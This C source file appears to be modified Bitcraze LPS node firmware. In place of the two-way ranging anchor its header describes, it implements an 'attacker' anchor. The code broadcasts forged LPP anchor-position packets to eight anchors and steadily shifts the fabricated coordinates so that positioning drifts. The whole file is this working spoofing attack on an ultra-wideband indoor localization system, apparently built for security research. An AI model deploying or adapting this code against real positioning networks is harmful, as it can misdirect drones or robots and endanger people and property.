/*
 *    ||          ____  _ __
 * +------+      / __ )(_) /_______________ _____  ___
 * | 0xBC |     / __  / / __/ ___/ ___/ __ `/_  / / _ \
 * +------+    / /_/ / / /_/ /__/ /  / /_/ / / /_/  __/
 *  ||  ||    /_____/_/\__/\___/_/   \__,_/ /___/\___/
 *
 * LPS node firmware.
 *
 * Copyright 2016, Bitcraze AB
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Lesser General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Foobar is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Foobar.  If not, see <http://www.gnu.org/licenses/>.
 */
/* uwb_twr_anchor.c: Uwb two way ranging anchor implementation */

#include "uwb.h"

#include <string.h>
#include <stdio.h>

#include "cfg.h"
#include "led.h"

#include "lpp.h"

#include "libdw1000.h"

#include "dwOps.h"
#include "mac.h"

// System configuration
static struct uwbConfig_s config;

static packet_t txPacket;

#define debug(...) // printf(__VA_ARGS__)

#define LPP_HEADER 0
#define LPP_TYPE 1
#define LPP_PAYLOAD 2
#define ANCHORS_COUNT 8

static uint16_t counter = 0;

static const uint8_t base_address[] = {0,0,0,0,0,0,0xcf,0xbc};

static float positions[ANCHORS_COUNT][3] = {
    {-2.1229, -3.6221, 0.35859},
    {-2.0413, 4.04489, 3.02399},
    {2.63910, 3.41729, 0.36259},
    {2.57909, -3.4709, 3.10229},
    {-1.9666, -3.6052, 2.94670},
    {-2.2823, 3.40969, 0.36570},
    {2.60570, 3.92840, 2.89000},
    {2.60560, -2.9679, 0.36320}
};

static void sendFakeLPPs(dwDevice_t *dev) {
    
    uwbConfig_t *uwbConfig = uwbGetConfig();

    if (uwbConfig->positionEnabled && counter < ANCHORS_COUNT * 100) {
        
        ledBlink(ledRanging, true);
        
        uint8_t destId = counter % ANCHORS_COUNT;
        
        memcpy(txPacket.sourceAddress, base_address, 8);
        txPacket.sourceAddress[0] = 0xff;
        memcpy(txPacket.destAddress, base_address, 8);
        txPacket.destAddress[0] = destId;
        
        txPacket.payload[LPP_HEADER] = SHORT_LPP;
        txPacket.payload[LPP_TYPE] = LPP_SHORT_ANCHOR_POSITION;
        
        if (counter % 100 == 0) {
            for (int i = 0; i<ANCHORS_COUNT; i++) {
                positions[i][0] += 0.01;
                positions[i][1] += 0.01;
            }
        }
        
        struct lppShortAnchorPosition_s *pos = (struct lppShortAnchorPosition_s*) &txPacket.payload[LPP_PAYLOAD];
        memcpy(pos->position, positions[destId], 3*sizeof(float));
        int payloadLength = 2 + sizeof(struct lppShortAnchorPosition_s);
        
        dwNewTransmit(dev);
        dwSetDefaults(dev);
        dwSetData(dev, (uint8_t*)&txPacket, MAC802154_HEADER_LENGTH+payloadLength);
        
        dwStartTransmit(dev);
        
        counter++;

    }

}


static void attackerAnchorInit(uwbConfig_t * newconfig, dwDevice_t *dev)
{
  // Set the LED for anchor mode
  ledOn(ledMode);

  config = *newconfig;

  // Initialize the packet in the TX buffer
  MAC80215_PACKET_INIT(txPacket, MAC802154_TYPE_DATA);
  txPacket.pan = 0xbccf;

  // onEvent is going to be called with eventTimeout which will start receiving
}

static uint32_t attackerAnchorOnEvent(dwDevice_t *dev, uwbEvent_t event)
{
  sendFakeLPPs(dev);
  return 10; // every 1ms
}


uwbAlgorithm_t uwbAttackerAlgorithm = {
  .init = attackerAnchorInit,
  .onEvent = attackerAnchorOnEvent,
};
